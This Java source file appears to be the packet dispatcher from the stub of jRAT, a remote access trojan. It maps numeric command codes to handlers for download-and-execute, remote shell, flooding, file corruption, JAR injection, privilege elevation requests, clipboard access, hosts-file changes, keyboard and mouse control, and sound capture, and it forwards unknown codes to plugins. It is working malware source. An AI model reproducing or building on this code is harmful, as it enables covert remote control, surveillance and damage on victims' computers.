package se.jrat.stub.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.common.PacketRange;
import se.jrat.common.exceptions.PacketException;
import se.jrat.stub.Connection;
import se.jrat.stub.Plugin;


public abstract class AbstractIncomingPacket {

	public static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> PACKETS_INCOMING = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	static {
		PACKETS_INCOMING.clear();
		PACKETS_INCOMING.put((byte) 0, Packet0Ping.class);
		PACKETS_INCOMING.put((byte) 10, Packet10Messagebox.class);
		PACKETS_INCOMING.put((byte) 11, Packet11Disconnect.class);
		PACKETS_INCOMING.put((byte) 12, Packet12RemoteScreen.class);
		// 13
		PACKETS_INCOMING.put((byte) 14, Packet14VisitURL.class);
		PACKETS_INCOMING.put((byte) 15, Packet15ListFiles.class);
		PACKETS_INCOMING.put((byte) 16, Packet16DeleteFile.class);
		PACKETS_INCOMING.put((byte) 17, Packet17DownloadExecute.class);
		PACKETS_INCOMING.put((byte) 18, Packet18Update.class);
		PACKETS_INCOMING.put((byte) 19, Packet19ListProcesses.class);
		PACKETS_INCOMING.put((byte) 20, Packet20KillProcess.class);
		PACKETS_INCOMING.put((byte) 21, Packet21ClientUploadFile.class);
		PACKETS_INCOMING.put((byte) 22, Packet22Flood.class);
		PACKETS_INCOMING.put((byte) 23, Packet23RemoteShellStart.class);
		PACKETS_INCOMING.put((byte) 24, Packet24RemoteShellStop.class);
		PACKETS_INCOMING.put((byte) 25, Packet25RemoteShellExecute.class);
		PACKETS_INCOMING.put((byte) 26, Packet26StopRemoteScreen.class);
		// 27
		PACKETS_INCOMING.put((byte) 28, Packet28ShutdownComputer.class);
		PACKETS_INCOMING.put((byte) 29, Packet29RestartComputer.class);
		PACKETS_INCOMING.put((byte) 30, Packet30LogoutComputer.class);
		PACKETS_INCOMING.put((byte) 31, Packet31ComputerSleep.class);
		PACKETS_INCOMING.put((byte) 32, Packet32LockComputer.class);
		PACKETS_INCOMING.put((byte) 33, Packet33UsedMemory.class);
		PACKETS_INCOMING.put((byte) 34, Packet34AdvancedDownload.class);
		PACKETS_INCOMING.put((byte) 35, Packet35Script.class);
		PACKETS_INCOMING.put((byte) 36, Packet36Uninstall.class);
		PACKETS_INCOMING.put((byte) 37, Packet37RestartJavaProcess.class);
		PACKETS_INCOMING.put((byte) 38, Packet38RunCommand.class);
		PACKETS_INCOMING.put((byte) 39, Packet39VisitManyURLs.class);
		PACKETS_INCOMING.put((byte) 40, Packet40Thumbnail.class);
		PACKETS_INCOMING.put((byte) 41, Packet41SpecialDirectory.class);
		PACKETS_INCOMING.put((byte) 42, Packet42ClientDownloadFile.class);
		PACKETS_INCOMING.put((byte) 43, Packet43CreateDirectory.class);
		PACKETS_INCOMING.put((byte) 44, Packet44PlaySoundFromURL.class);
		PACKETS_INCOMING.put((byte) 45, Packet45Reconnect.class);
		PACKETS_INCOMING.put((byte) 46, Packet46CrazyMouse.class);
		PACKETS_INCOMING.put((byte) 47, Packet47RenameFile.class);
		PACKETS_INCOMING.put((byte) 48, Packet48ChatStart.class);
		PACKETS_INCOMING.put((byte) 49, Packet49ChatEnd.class);
		PACKETS_INCOMING.put((byte) 50, Packet50UpdateRemoteScreen.class);
		PACKETS_INCOMING.put((byte) 51, Packet51ChatMessage.class);
		// 52
		PACKETS_INCOMING.put((byte) 53, Packet53StartSearch.class);
		PACKETS_INCOMING.put((byte) 54, Packet54StopSearch.class);
		PACKETS_INCOMING.put((byte) 55, Packet55HostsFile.class);
		PACKETS_INCOMING.put((byte) 56, Packet56UpdateHostsFile.class);
		PACKETS_INCOMING.put((byte) 57, Packet57UTorrentDownloads.class);
		PACKETS_INCOMING.put((byte) 58, Packet58NudgeChat.class);
		PACKETS_INCOMING.put((byte) 59, Packet59Clipboard.class);
		PACKETS_INCOMING.put((byte) 60, Packet60PreviewFile.class);
		PACKETS_INCOMING.put((byte) 61, Packet61SystemJavaProperties.class);
		PACKETS_INCOMING.put((byte) 62, Packet62PreviewImage.class);
		PACKETS_INCOMING.put((byte) 63, Packet63PreviewArchive.class);
		PACKETS_INCOMING.put((byte) 64, Packet64FileHash.class);
		PACKETS_INCOMING.put((byte) 65, Packet65Beep.class);
		PACKETS_INCOMING.put((byte) 66, Packet66PianoNote.class);
		PACKETS_INCOMING.put((byte) 67, Packet67LongPianoNote.class);
		// 68
		PACKETS_INCOMING.put((byte) 69, Packet69Print.class);
		PACKETS_INCOMING.put((byte) 70, Packet70CorruptFile.class);
		PACKETS_INCOMING.put((byte) 71, Packet71LocalNetworkDevices.class);
		PACKETS_INCOMING.put((byte) 72, Packet72IPConfig.class);
		PACKETS_INCOMING.put((byte) 73, Packet73ActivePorts.class);
		PACKETS_INCOMING.put((byte) 74, Packet74GarbageCollect.class);
		PACKETS_INCOMING.put((byte) 75, Packet75AllThumbnails.class);
		PACKETS_INCOMING.put((byte) 76, Packet76Speech.class);
		PACKETS_INCOMING.put((byte) 77, Packet77ListServices.class);
		PACKETS_INCOMING.put((byte) 78, Packet78RegistryStartup.class);
		PACKETS_INCOMING.put((byte) 79, Packet79BrowseRegistry.class);
		PACKETS_INCOMING.put((byte) 80, Packet80CustomRegQuery.class);
		PACKETS_INCOMING.put((byte) 81, Packet81InstalledPrograms.class);
		PACKETS_INCOMING.put((byte) 82, Packet82NetworkAdapters.class);
		PACKETS_INCOMING.put((byte) 83, Packet83ClientDownloadSound.class);
		PACKETS_INCOMING.put((byte) 84, Packet84ToggleSoundCapture.class);
		PACKETS_INCOMING.put((byte) 85, Packet85ThumbnailPreview.class);
		PACKETS_INCOMING.put((byte) 86, Packet86ErrorLog.class);
		PACKETS_INCOMING.put((byte) 87, Packet87DeleteErrorLog.class);
		PACKETS_INCOMING.put((byte) 88, Packet88StubConfig.class);
		PACKETS_INCOMING.put((byte) 89, Packet89LoadedPlugins.class);
		PACKETS_INCOMING.put((byte) 90, Packet90SystemProperties.class);
		PACKETS_INCOMING.put((byte) 91, Packet91MouseMove.class);
		PACKETS_INCOMING.put((byte) 92, Packet92MousePress.class);
		PACKETS_INCOMING.put((byte) 93, Packet93MouseRelease.class);
		PACKETS_INCOMING.put((byte) 94, Packet94KeyPress.class);
		PACKETS_INCOMING.put((byte) 95, Packet95KeyRelease.class);
		PACKETS_INCOMING.put((byte) 96, Packet96EnvironmentVariables.class);
		PACKETS_INCOMING.put((byte) 97, Packet97RegistryAdd.class);
		PACKETS_INCOMING.put((byte) 98, Packet98InjectJAR.class);
		PACKETS_INCOMING.put((byte) 99, Packet99RegistryDelete.class);
		PACKETS_INCOMING.put((byte) 100, Packet100RequestElevation.class);
		PACKETS_INCOMING.put((byte) 101, Packet101DownloadPlugin.class);
		PACKETS_INCOMING.put((byte) 102, Packet102PauseClientDownload.class);
		PACKETS_INCOMING.put((byte) 103, Packet103CompleteClientDownload.class);
		PACKETS_INCOMING.put((byte) 104, Packet104ClientDownloadPart.class);
		PACKETS_INCOMING.put((byte) 105, Packet105CancelClientUpload.class);
	}

	public static final void execute(Connection con, byte header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Byte> set = PACKETS_INCOMING.keySet();
			for (byte b : set) {
				if (b == header) {
					packet = PACKETS_INCOMING.get(b).newInstance();
					break;
				}
			}
			
			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
				packet.read(con);
			} else {
				for (Plugin p : Plugin.list) {
					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
				}
			}
		} catch (Exception ex) {
			PacketException ex1 = new PacketException("Failed to handle packet " + header, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read(Connection con) throws Exception;

}
